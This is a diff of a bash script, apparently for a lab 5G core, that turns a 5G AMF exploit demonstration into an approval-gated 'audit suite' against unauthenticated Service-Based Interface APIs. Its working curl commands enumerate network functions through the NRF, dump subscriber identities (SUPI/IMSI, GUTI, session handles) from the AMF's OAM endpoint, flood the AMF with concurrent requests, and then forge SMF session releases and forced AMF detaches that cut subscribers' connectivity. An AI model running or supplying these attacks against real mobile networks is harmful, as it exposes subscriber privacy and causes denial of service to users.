@@ -1,7 +1,6 @@
 #!/usr/bin/env bash
 set -e
 
-# Target Network Function Endpoints (Mapped via 10.0.0.0/24 Core Subnet)
 AMF_SBI="http://10.0.0.18:8000"
 NRF_SBI="http://10.0.0.10:8000"
 SMF_SBI="http://10.0.0.2:8000"
@@ -11,16 +10,16 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 RED='\033[0;31m'
 BOLD='\033[1m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
 prompt_approval() {
     local phase_title="$1"
     echo -e "${YELLOW}------------------------------------------------------------${NC}"
     echo -e "${BOLD}[APPROVAL REQUIRED] Ready to execute: ${phase_title}${NC}"
-    read -p "Press [Enter] to approve and execute (or type 's' to skip): " USER_CHOICE
+    read -p "Press [Enter] to approve (or type 's' to skip): " USER_CHOICE
     echo -e "${YELLOW}------------------------------------------------------------${NC}"
     if [[ "$USER_CHOICE" =~ ^[Ss]$ ]]; then
-        echo -e "${RED}[*] Skipping this phase upon user request.${NC}\n"
+        echo -e "${RED}[*] Skipped: ${phase_title}.${NC}\n"
         return 1
     fi
     return 0
@@ -28,184 +27,241 @@ prompt_approval() {
 
 clear
 echo -e "${CYAN}======================================================================"
-echo "      5G SERVICE-BASED ARCHITECTURE (SBA) CONTROL-PLANE AUDIT         "
-echo "        Target: Access and Mobility Management Function (AMF)         "
+echo "         5G AMF SERVICE-BASED ARCHITECTURE AUDIT SUITE                "
+echo "        (Reconnaissance First -> Destructive Exploits Last)           "
 echo -e "======================================================================${NC}"
-echo -e "${BOLD}Vulnerability Overview:${NC}"
-echo "In 3GPP 5G Standalone (SA), Network Functions talk via HTTP/2 REST APIs."
-echo "When mutual TLS (mTLS) and OAuth2 token validation are disabled in core"
-echo "deployments (oauth: false), internal APIs become unauthenticated and exposed."
+echo "AMF Target: $AMF_SBI"
+echo "NRF Target: $NRF_SBI"
+echo "SMF Target: $SMF_SBI"
 echo ""
 
 # --------------------------------------------------------------------------
-# PREREQUISITE CHECK: Routing & SBI Reachability
+# STEP 1: SERVICE DISCOVERY (BASE URL PROBING)
 # --------------------------------------------------------------------------
-echo -e "${BOLD}[Prerequisite Check] Verifying Control-Plane Reachability${NC}"
-echo "Command to run: ping -c 1 -W 2 10.0.0.18"
-if ping -c 1 -W 2 10.0.0.18 >/dev/null 2>&1; then
-    echo -e "${GREEN}[+] Reachability verified: Core SBI (10.0.0.18) is responding.${NC}\n"
-else
-    echo -e "${RED}[-] Error: Cannot reach AMF SBI (10.0.0.18).${NC}"
-    echo "    Verify that 'sudo ./setup_and_start_ue.sh' was run to establish the route."
-    exit 1
+echo -e "${CYAN}======================================================================"
+echo " STEP 1: Standard Service Discovery (Base URL Probing)                "
+echo -e "======================================================================${NC}"
+echo -e "${BOLD}Reference:${NC} AMF.txt [Service discovery]"
+echo -e "${BOLD}Purpose:${NC} Probes auxiliary AMF services (namf-comm, namf-mt, namf-loc) to check reachability."
+echo -e "${BOLD}Destructive Impact:${NC} None (Safe to run)"
+echo ""
+echo -e "${BOLD}Commands to run:${NC}"
+echo -e "  ${GREEN}curl -s -o /dev/null -w \"HTTP %{http_code}\" $AMF_SBI/namf-comm/v1/${NC}"
+echo -e "  ${GREEN}curl -s -o /dev/null -w \"HTTP %{http_code}\" $AMF_SBI/namf-mt/v1/${NC}"
+echo -e "  ${GREEN}curl -s -o /dev/null -w \"HTTP %{http_code}\" $AMF_SBI/namf-loc/v1/${NC}"
+echo ""
+
+if prompt_approval "Step 1: Service Discovery"; then
+    curl -s -o /dev/null -w "  namf-comm: HTTP %{http_code}\n" "$AMF_SBI/namf-comm/v1/" || true
+    curl -s -o /dev/null -w "  namf-mt:   HTTP %{http_code}\n" "$AMF_SBI/namf-mt/v1/" || true
+    curl -s -o /dev/null -w "  namf-loc:  HTTP %{http_code}\n" "$AMF_SBI/namf-loc/v1/" || true
+    echo ""
 fi
 
 # --------------------------------------------------------------------------
-# PHASE 1: NRF RECONNAISSANCE & AMF DISCOVERY
+# STEP 2: NRF INSTANCE IDENTIFICATION
 # --------------------------------------------------------------------------
 echo -e "${CYAN}======================================================================"
-echo " PHASE 1: Network Repository Function (NRF) Reconnaissance            "
+echo " STEP 2: AMF Instance Enumeration via NRF (nnrf-nfm)                  "
 echo -e "======================================================================${NC}"
-echo -e "${BOLD}3GPP Specification Reference:${NC} 3GPP TS 29.510 (Nnrf_NFManagement Service)"
-echo -e "${BOLD}Why This Matters:${NC}"
-echo "The NRF is the central registry for all 5G Network Functions. Under 3GPP"
-echo "specs, any NF queries NRF to locate peers. Without OAuth2, any attacker"
-echo "on the transport network can dump all registered AMFs, IP bindings, and UUIDs."
+echo -e "${BOLD}Reference:${NC} 3GPP TS 29.510 (Nnrf_NFManagement) / AMF.txt"
+echo -e "${BOLD}Purpose:${NC} Dumps registered AMF profile metadata and service endpoints from NRF."
+echo -e "${BOLD}Destructive Impact:${NC} None (Safe to run)"
 echo ""
-CMD_PHASE1="curl -s -X GET \"$NRF_SBI/nnrf-nfm/v1/nf-instances?nf-type=AMF\" -H \"Accept: application/json\""
-echo -e "${BOLD}Command to run:${NC}"
-echo -e "  ${GREEN}$CMD_PHASE1${NC}"
-echo -e "${BOLD}Expected Outcome:${NC}"
-echo "NRF will return HTTP 200 containing registered AMF instance profiles, supported"
-echo "PLMNs (208/93), and available service endpoints (namf-comm, namf-oam)."
-echo ""
+CMD_NRF="curl -s \"$NRF_SBI/nnrf-nfm/v1/nf-instances?nf-type=AMF\" -H \"Accept: application/json\""
+echo -e "${BOLD}Command to run:${NC} ${GREEN}$CMD_NRF${NC}\n"
 
-if prompt_approval "Phase 1: NRF Query"; then
-    echo -e "${BOLD}[+] Executing command...${NC}"
-    PHASE1_RESP=$(eval "$CMD_PHASE1" || true)
-    if [ -n "$PHASE1_RESP" ] && [ "$PHASE1_RESP" != "null" ]; then
-        echo -e "${GREEN}[+] Response received from NRF:${NC}"
-        echo "$PHASE1_RESP" | jq . 2>/dev/null || echo "$PHASE1_RESP"
+if prompt_approval "Step 2: NRF Discovery"; then
+    NRF_OUT=$(eval "$CMD_NRF" || true)
+    if [ -n "$NRF_OUT" ] && [ "$NRF_OUT" != "null" ]; then
+        echo "$NRF_OUT" | jq . 2>/dev/null || echo "$NRF_OUT"
     else
-        echo -e "${YELLOW}[!] NRF returned no active AMF profile array. Proceeding to direct AMF query.${NC}"
+        echo -e "${YELLOW}[!] No instance array returned by NRF. Continuing...${NC}"
     fi
     echo ""
 fi
 
 # --------------------------------------------------------------------------
-# PHASE 2: UNAUTHENTICATED AMF SUBSCRIBER CONTEXT EXTRACTION (namf-oam)
+# STEP 3: SUBSCRIBER CONTEXT RECONNAISSANCE (namf-oam)
 # --------------------------------------------------------------------------
 echo -e "${CYAN}======================================================================"
-echo " PHASE 2: Unauthenticated Subscriber Context Extraction (namf-oam)     "
+echo " STEP 3: Global Subscriber Context Extraction (namf-oam)              "
 echo -e "======================================================================${NC}"
-echo -e "${BOLD}3GPP Specification Reference:${NC} 3GPP TS 29.518 (Namf_OAM Service)"
-echo -e "${BOLD}Why This Matters:${NC}"
-echo "The Namf_OAM service provides operational management interfaces. The endpoint"
-echo "'/registered-ue-context' exposes confidential mobile subscriber states"
-echo "directly from AMF volatile memory. This leaks sensitive subscriber privacy"
-echo "identifiers without triggering radio or core alarms."
+echo -e "${BOLD}Reference:${NC} 3GPP TS 29.518 (Namf_OAM) / AMF.txt"
+echo -e "${BOLD}Purpose:${NC} Harvests SUPI, GUTI, TAC, and session handles from active AMF memory."
+echo -e "${BOLD}Destructive Impact:${NC} None (Passive information disclosure)"
 echo ""
-CMD_PHASE2="curl -s -X GET \"$AMF_SBI/namf-oam/v1/registered-ue-context\" -H \"Accept: application/json\""
-echo -e "${BOLD}Command to run:${NC}"
-echo -e "  ${GREEN}$CMD_PHASE2${NC}"
-echo -e "${BOLD}Expected Outcome:${NC}"
-echo "An HTTP 200 JSON dump containing all registered mobile devices, exposing:"
-echo "  1. SUPI / IMSI (Permanent subscriber identity)"
-echo "  2. 5G-GUTI (Globally Unique Temporary Identifier)"
-echo "  3. TAC (Tracking Area Code where the UE is located)"
-echo "  4. SmContextRef (Unique session handle needed for session hijacking/DoS)"
-echo ""
+CMD_DUMP="curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context\""
+echo -e "${BOLD}Command to run:${NC} ${GREEN}$CMD_DUMP | jq .${NC}\n"
 
-SUPI=""
-GUTI=""
+TARGET_SUPI=""
+TARGET_GUTI=""
 SM_REF=""
 PDU_ID=""
 
-if prompt_approval "Phase 2: AMF OAM Context Leak"; then
-    echo -e "${BOLD}[+] Executing command...${NC}"
-    PHASE2_RESP=$(eval "$CMD_PHASE2")
-
-    if [ -z "$PHASE2_RESP" ] || [ "$PHASE2_RESP" == "null" ] || [ "$PHASE2_RESP" == "[]" ]; then
-        echo -e "${RED}[-] No registered UEs found in AMF memory.${NC}"
-        echo "    Ensure your UERANSIM UE is running and registered."
+if prompt_approval "Step 3: Global Context Dump"; then
+    RAW_CONTEXTS=$(eval "$CMD_DUMP")
+    if [ -z "$RAW_CONTEXTS" ] || [ "$RAW_CONTEXTS" == "null" ] || [ "$RAW_CONTEXTS" == "[]" ]; then
+        echo -e "${RED}[-] No registered UEs found in AMF memory. Verify UE registration.${NC}"
         exit 1
     fi
 
-    echo -e "${GREEN}[+] Successfully dumped subscriber context from AMF:${NC}"
-    echo "$PHASE2_RESP" | jq .
+    echo -e "${GREEN}[+] Dumped Active Subscribers:${NC}"
+    echo "$RAW_CONTEXTS" | jq .
 
-    # Extract target values
-    SUPI=$(echo "$PHASE2_RESP" | jq -r '.[0].Supi')
-    GUTI=$(echo "$PHASE2_RESP" | jq -r '.[0].Guti')
-    SM_REF=$(echo "$PHASE2_RESP" | jq -r '.[0].PduSessions[0].SmContextRef // empty')
-    PDU_ID=$(echo "$PHASE2_RESP" | jq -r '.[0].PduSessions[0].PduSessionId // 1')
-    DNN=$(echo "$PHASE2_RESP" | jq -r '.[0].PduSessions[0].Dnn // "internet"')
+    TARGET_SUPI=$(echo "$RAW_CONTEXTS" | jq -r '.[0].Supi')
+    TARGET_GUTI=$(echo "$RAW_CONTEXTS" | jq -r '.[0].Guti')
+    SM_REF=$(echo "$RAW_CONTEXTS" | jq -r '.[0].PduSessions[0].SmContextRef // empty')
+    PDU_ID=$(echo "$RAW_CONTEXTS" | jq -r '.[0].PduSessions[0].PduSessionId // 1')
 
     echo ""
     echo -e "${BOLD}============================================================${NC}"
-    echo -e "${BOLD} [!] EXFILTRATED TARGET PARAMETERS:${NC}"
-    echo -e "     - ${BOLD}Target SUPI (IMSI):${NC}  ${GREEN}$SUPI${NC}"
-    echo -e "     - ${BOLD}Target 5G-GUTI:${NC}       ${GREEN}$GUTI${NC}"
-    echo -e "     - ${BOLD}Active Data Network:${NC}  ${GREEN}$DNN (PDU ID: $PDU_ID)${NC}"
-    echo -e "     - ${BOLD}Target SmContextRef:${NC}  ${GREEN}$SM_REF${NC}"
+    echo -e "${BOLD} [!] EXFILTRATED METADATA FOR TARGETING:${NC}"
+    echo -e "     - SUPI (IMSI):  ${GREEN}$TARGET_SUPI${NC}"
+    echo -e "     - 5G-GUTI:      ${GREEN}$TARGET_GUTI${NC}"
+    echo -e "     - SmContextRef: ${GREEN}$SM_REF${NC}"
     echo -e "${BOLD}============================================================${NC}\n"
 fi
 
 # --------------------------------------------------------------------------
-# PHASE 3: UNAUTHORIZED USER-PLANE SESSION TERMINATION (PDU TEARDOWN)
+# STEP 4: TARGETED SINGLE-UE QUERY
+# --------------------------------------------------------------------------
+if [ -n "$TARGET_SUPI" ]; then
+    echo -e "${CYAN}======================================================================"
+    echo " STEP 4: Targeted Individual Subscriber Query                         "
+    echo -e "======================================================================${NC}"
+    echo -e "${BOLD}Reference:${NC} AMF.txt [/registered-ue-context/imsi-<number>]"
+    echo -e "${BOLD}Purpose:${NC} Queries the target SUPI directly by ID to test endpoint filtering."
+    echo -e "${BOLD}Destructive Impact:${NC} None (Passive query)"
+    echo ""
+    CMD_SINGLE="curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context/$TARGET_SUPI\""
+    echo -e "${BOLD}Command to run:${NC} ${GREEN}$CMD_SINGLE | jq .${NC}\n"
+
+    if prompt_approval "Step 4: Individual SUPI Query"; then
+        SINGLE_OUT=$(eval "$CMD_SINGLE")
+        echo -e "${GREEN}[+] Filtered Result for $TARGET_SUPI:${NC}"
+        echo "$SINGLE_OUT" | jq . 2>/dev/null || echo "$SINGLE_OUT"
+        echo ""
+    fi
+fi
+
+# --------------------------------------------------------------------------
+# STEP 5: ASYNCHRONOUS CONCURRENCY STRESS TEST
 # --------------------------------------------------------------------------
 echo -e "${CYAN}======================================================================"
-echo " PHASE 3: Unauthenticated PDU Session Teardown (Denial of Service)    "
+echo " STEP 5: Asynchronous AMF OAM Concurrency Stress Test                 "
 echo -e "======================================================================${NC}"
-echo -e "${BOLD}3GPP Specification Reference:${NC} 3GPP TS 29.502 (Nsmf_PDUSession Service)"
-echo -e "${BOLD}Why This Matters:${NC}"
-echo "Using the leaked 'SmContextRef' obtained from AMF in Phase 2, an attacker can"
-echo "cross over to the Session Management Function (SMF) and forge an unauthenticated"
-echo "release request. The SMF instructs the UPF to wipe the GTP tunnel rules,"
-echo "instantly killing the victim's internet connection while the UE still believes"
-echo "it is registered to the cell."
+echo -e "${BOLD}Reference:${NC} AMF.txt [bombard AMF with requests]"
+echo -e "${BOLD}Purpose:${NC} Evaluates AMF thread handling and latency under 100 concurrent requests."
+echo -e "${BOLD}Destructive Impact:${NC} Low/Non-destructive (Temporary load; does not kill sessions)"
 echo ""
-
-if [ -z "$SM_REF" ] || [ "$SM_REF" == "null" ]; then
-    echo -e "${YELLOW}[!] No active SmContextRef found. Cannot demonstrate Phase 3.${NC}"
-    exit 0
-fi
-
-CMD_PHASE3="curl -i -X POST \"$SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release\" \\
-  -H \"Content-Type: application/json\" \\
-  -d '{\"cause\": \"PDU_SESSION_STATUS_MISMATCH\"}'"
-
 echo -e "${BOLD}Command to run:${NC}"
-echo -e "${GREEN}$CMD_PHASE3${NC}"
+echo -e "  ${GREEN}for i in {1..100}; do curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context\" > /dev/null & done; wait${NC}\n"
+
+if prompt_approval "Step 5: Concurrency Flood"; then
+    echo -e "${BOLD}[+] Firing 100 parallel requests...${NC}"
+    START_T=$(date +%s%N)
+    for i in {1..100}; do
+        curl -s "$AMF_SBI/namf-oam/v1/registered-ue-context" > /dev/null &
+    done
+    wait
+    END_T=$(date +%s%N)
+    DIFF_MS=$(( (END_T - START_T) / 1000000 ))
+    echo -e "${GREEN}[+] Completed 100 concurrent requests in ${DIFF_MS} ms.${NC}\n"
+fi
+
+# --------------------------------------------------------------------------
+# STEP 6: REAL-TIME MONITORING LOOP
+# --------------------------------------------------------------------------
+echo -e "${CYAN}======================================================================"
+echo " STEP 6: Real-Time Network State Monitoring                           "
+echo -e "======================================================================${NC}"
+echo -e "${BOLD}Reference:${NC} AMF.txt [Real life network monitoring]"
+echo -e "${BOLD}Purpose:${NC} Runs continuous polling to observe live session states before teardowns."
+echo -e "${BOLD}Destructive Impact:${NC} None"
 echo ""
-echo -e "${BOLD}Expected Outcome:${NC}"
-echo "  1. SMF returns HTTP 200 OK or 204 No Content, confirming session tear-down."
-echo "  2. The UPF hardware/kernel pipeline immediately drops packet forwarding[cite: 5]."
-echo "  3. Running 'ping -I uesimtun0 8.8.8.8' will immediately fail with 100% loss[cite: 1, 5]."
+echo -e "${BOLD}Command to run:${NC}"
+echo -e "  ${GREEN}watch -n 3 'date; curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context\" | jq \".[] | {Supi, CmState, AccessType}\"'${NC}\n"
+
+read -p "[?] Enter live monitoring view? (y/N): " VIEW_MONITOR
+if [[ "$VIEW_MONITOR" =~ ^[Yy]$ ]]; then
+    echo -e "${BOLD}[*] Starting watch loop. Press [Ctrl+C] when ready to continue to teardowns...${NC}"
+    watch -n 3 "date; curl -s \"$AMF_SBI/namf-oam/v1/registered-ue-context\" | jq '.[] | {Supi, CmState, AccessType}' 2>/dev/null || echo 'No active UEs'"
+fi
 echo ""
 
-if prompt_approval "Phase 3: SMF Session Release Exploit"; then
-    echo -e "${BOLD}[+] Executing unauthenticated session release against SMF...${NC}"
-    HTTP_RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST \
-      "$SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release" \
-      -H "Content-Type: application/json" \
-      -d '{"cause": "PDU_SESSION_STATUS_MISMATCH"}')
+# ==========================================================================
+# DESTRUCTIVE EXPLOITATION STAGE (TERMINATION ATTACKS)
+# ==========================================================================
+echo -e "${RED}======================================================================"
+echo "                   DESTRUCTIVE EXPLOITATION PHASE                     "
+echo "  The attacks below terminate sessions and sever user-plane traffic.  "
+echo -e "======================================================================${NC}\n"
 
-    HTTP_STATUS=$(echo "$HTTP_RESPONSE" | grep "HTTP_STATUS" | cut -d':' -f2)
-    RESPONSE_BODY=$(echo "$HTTP_RESPONSE" | sed '/HTTP_STATUS/d')
-
-    echo -e "${BOLD}[+] Server Response Code:${NC} HTTP $HTTP_STATUS"
-    if [ -n "$RESPONSE_BODY" ]; then
-        echo -e "${BOLD}[+] Response Body:${NC}"
-        echo "$RESPONSE_BODY"
-    fi
+# --------------------------------------------------------------------------
+# STEP 7: SMF DIRECT PDU SESSION RELEASE (nsmf-pdusession)
+# --------------------------------------------------------------------------
+if [ -n "$SM_REF" ]; then
+    echo -e "${CYAN}======================================================================"
+    echo " STEP 7: Unauthenticated SMF PDU Session Teardown                     "
+    echo -e "======================================================================${NC}"
+    echo -e "${BOLD}Reference:${NC} 3GPP TS 29.502 (Nsmf_PDUSession)"
+    echo -e "${BOLD}Target:${NC} SmContextRef: $SM_REF"
+    echo -e "${BOLD}Destructive Impact:${NC} HIGH. Erases the UPF forwarding rule; kills internet traffic on uesimtun0."
     echo ""
+    CMD_SMF="curl -i -X POST \"$SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release\" \\
+      -H \"Content-Type: application/json\" \\
+      -d '{\"cause\": \"PDU_SESSION_STATUS_MISMATCH\"}'"
+    echo -e "${BOLD}Command to run:${NC}\n${GREEN}$CMD_SMF${NC}\n"
 
-    # --------------------------------------------------------------------------
-    # VERIFICATION: Test whether the 5G data tunnel survived
-    # --------------------------------------------------------------------------
-    echo -e "${BOLD}[*] Verifying Data-Plane Disruption on 'uesimtun0'...${NC}"
-    echo "Command to run: ping -c 3 -W 1 -I uesimtun0 8.8.8.8"
-    if ping -c 3 -W 1 -I uesimtun0 8.8.8.8 >/dev/null 2>&1; then
-        echo -e "${YELLOW}[?] Warning: Data plane is still responding. Inspect SMF server logs.${NC}"
-    else
-        echo -e "${GREEN}${BOLD}[EXPLOIT CONFIRMED SUCCESSFUL]${NC}"
-        echo -e "Packets to 8.8.8.8 through 'uesimtun0' timed out (100% packet loss)!"
-        echo -e "The active subscriber's 5G session has been terminated remotely[cite: 1, 5]."
+    if prompt_approval "Step 7: SMF Session Teardown"; then
+        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+          "$SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release" \
+          -H "Content-Type: application/json" \
+          -d '{"cause": "PDU_SESSION_STATUS_MISMATCH"}')
+
+        echo -e "${BOLD}[+] SMF Response:${NC} HTTP $HTTP_CODE"
+        if [ "$HTTP_CODE" -eq 200 ] || [ "$HTTP_CODE" -eq 204 ]; then
+            echo -e "${GREEN}[+] SUCCESS: SMF released user-plane context.${NC}"
+            echo -e "[*] Verifying data-plane disruption..."
+            if ! ping -c 3 -W 1 -I uesimtun0 8.8.8.8 >/dev/null 2>&1; then
+                echo -e "${GREEN}[CONFIRMED] uesimtun0 traffic dropped (100% loss).${NC}"
+            fi
+        fi
+        echo ""
     fi
 fi
 
-echo ""
+# --------------------------------------------------------------------------
+# STEP 8: FORCED NAS RELEASE VIA namf-comm
+# --------------------------------------------------------------------------
+if [ -n "$TARGET_SUPI" ]; then
+    echo -e "${CYAN}======================================================================"
+    echo " STEP 8: Forced Subscriber Detach via namf-comm                       "
+    echo -e "======================================================================${NC}"
+    echo -e "${BOLD}Reference:${NC} 3GPP TS 29.518 / AMF.txt [Trigger an UE Release via curl]"
+    echo -e "${BOLD}Target SUPI:${NC} $TARGET_SUPI"
+    echo -e "${BOLD}Destructive Impact:${NC} CRITICAL. Forcibly tears down the radio connection and drops the UE context."
+    echo ""
+    CMD_COMM="curl -i -X POST \"$AMF_SBI/namf-comm/v1/ue-contexts/$TARGET_SUPI/release\" \\
+      -H \"Content-Type: application/json\" \\
+      -d '{\"pduSessionId\": $PDU_ID, \"cause\": \"NAS\", \"ngApCause\": {\"group\": 1, \"value\": 2}}'"
+    echo -e "${BOLD}Command to run:${NC}\n${GREEN}$CMD_COMM${NC}\n"
+
+    if prompt_approval "Step 8: Forced AMF Release"; then
+        HTTP_COMM_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+          "$AMF_SBI/namf-comm/v1/ue-contexts/$TARGET_SUPI/release" \
+          -H "Content-Type: application/json" \
+          -d "{\"pduSessionId\": $PDU_ID, \"cause\": \"NAS\", \"ngApCause\": {\"group\": 1, \"value\": 2}}")
+
+        echo -e "${BOLD}[+] AMF Response:${NC} HTTP $HTTP_COMM_CODE"
+        if [ "$HTTP_COMM_CODE" -eq 200 ] || [ "$HTTP_COMM_CODE" -eq 204 ]; then
+            echo -e "${GREEN}[+] SUCCESS: AMF released subscriber $TARGET_SUPI.${NC}"
+        fi
+        echo ""
+    fi
+fi
+
 echo -e "${CYAN}======================================================================"
-echo " Audit and Exploit Demonstration Run Complete                         "
+echo " AMF Audit Complete. Both non-destructive and destructive tests done. "
 echo -e "======================================================================${NC}"
